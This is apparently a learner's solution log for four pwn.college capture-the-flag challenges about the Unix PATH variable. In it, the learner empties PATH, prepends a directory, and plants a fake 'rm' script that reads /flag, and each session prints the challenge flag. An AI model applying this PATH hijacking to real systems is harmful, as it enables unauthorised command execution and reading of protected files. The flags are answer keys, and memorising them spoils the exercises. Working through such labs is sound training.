1-
```
hacker@path~the-path-variable:~$ PATH=""
hacker@path~the-path-variable:~$ export PATH
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{4tkJHp-J4y0jGjIbfKPXI0AHWWR.dZzNwUDLyczN1czW}
```
2-
```bash
hacker@path~setting-path:~$ ls /challenge/more_commands
win
hacker@path~setting-path:~$ PATH=/challenge/more_commands
hacker@path~setting-path:~$ /challenge/run win
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{ESlUY6MjRF3dfYF3mDOiRhrsodc.dVzNyUDLyczN1czW}
```
3-
```
hacker@path~adding-commands:~$ touch win
hacker@path~adding-commands:~$ echo "cat /flag" > /home/hacker/win
hacker@path~adding-commands:~$ PATH=$PATH:/home/hacker
hacker@path~adding-commands:~$ chmod a+x /home/hacker/win
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{Uf3JJkXb-Y6HK_SqTsTTTLhLpaw.dZzNyUDLyczN1czW}
```
4-
```
hacker@path~hijacking-commands:~$ touch rm
hacker@path~hijacking-commands:~$ echo "cat /flag" > /home/hacker/rm
hacker@path~hijacking-commands:~$ chmod a+x /home/hacker/rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{gUX27uUXw5ji3hw1EnO8L8bGg8_.ddzNyUDLyczN1czW}
```
